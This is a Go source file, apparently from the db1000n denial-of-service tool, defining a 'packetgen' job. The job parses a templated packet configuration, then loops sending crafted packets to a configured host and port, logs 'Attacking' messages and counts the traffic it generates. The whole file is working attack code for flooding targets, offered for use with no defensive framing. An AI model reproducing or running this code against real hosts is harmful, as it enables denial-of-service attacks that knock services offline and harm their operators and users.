package jobs

import (
	"context"
	"encoding/json"
	"log"
	"strconv"
	"time"

	"github.com/google/uuid"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/packetgen"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func packetgenJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	type packetgenJobConfig struct {
		BasicJobConfig
		Packet json.RawMessage
		Host   string
		Port   string
	}

	var jobConfig packetgenJobConfig

	if err := json.Unmarshal(args, &jobConfig); err != nil {
		log.Printf("Error parsing json: %v", err)
		return err
	}

	host := templates.ParseAndExecute(jobConfig.Host)
	port, err := strconv.Atoi(templates.ParseAndExecute(jobConfig.Port))
	if err != nil {
		log.Printf("Error parsing port: %v", err)
		return err
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())

	for jobConfig.Next(ctx) {
		select {
		case <-ticker.C:
			log.Printf("Attacking %v:%v", jobConfig.Host, jobConfig.Port)
		default:
		}

		packetConfigBytes := []byte(templates.ParseAndExecute(string(jobConfig.Packet)))
		if debug {
			log.Printf("Parsed packet config template:\n%s", string(packetConfigBytes))
		}

		var packetConfig packetgen.PacketConfig
		if err := json.Unmarshal(packetConfigBytes, &packetConfig); err != nil {
			log.Printf("Error parsing json: %v", err)
			return err
		}

		packetConfigBytes, err = json.Marshal(packetConfig)
		if err != nil {
			log.Printf("Error marshaling back to json: %v", err)
			return err
		}

		if debug {
			log.Printf("[packetgen] parsed packet config:\n%v", string(packetConfigBytes))
		}

		len, err := packetgen.SendPacket(packetConfig, host, port)
		if err != nil {
			log.Printf("Error sending packet: %v", err)
			return err
		}

		trafficMonitor.Add(len)
	}

	return nil
}
